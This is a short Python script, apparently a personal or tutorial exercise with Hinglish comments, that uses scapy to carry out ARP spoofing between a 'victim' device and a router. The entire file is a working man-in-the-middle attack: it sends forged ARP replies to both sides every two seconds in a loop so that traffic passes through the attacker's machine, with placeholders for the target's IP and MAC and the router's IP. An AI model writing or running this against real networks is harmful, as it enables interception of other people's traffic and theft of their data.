import scapy.all as scapy
import time
def spoof(target_ip, spoof_ip):
    # find mac address of target
    #packer creation
    #op2= arp reply
    #pdst= destination ip
    #hwdst= destination mac
    #psrc=router ip
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=scapy.getmacbyip(target_ip), psrc=spoof_ip)
    #send the packet
    scapy.send(packet, verbose=False)
    # --- CONFIGURATION ( ---

victim_ip = "x.x.x.x"   # Apne Phone ki IP dalo
victim_mac = "x:x:x:x:x:x"  # Apne Phone ka MAC dalo (Phone settings se milega)
router_ip = "x.x.x.x"   # Apne Router ki IP dalo (Jo ipconfig se mili thi)
# --- EXECUTION ---
print("Sending spoofed packets... (Press Ctrl+C to stop)")
try:
    while True:
        spoof(victim_ip, router_ip) # Victim ko bolo "Main Router hu"
        spoof(router_ip, victim_ip) # Router ko bolo "Main Victim hu"
        time.sleep(2) # Har 2 second mein jhooth bolo
except KeyboardInterrupt:
    print("\nStopped.")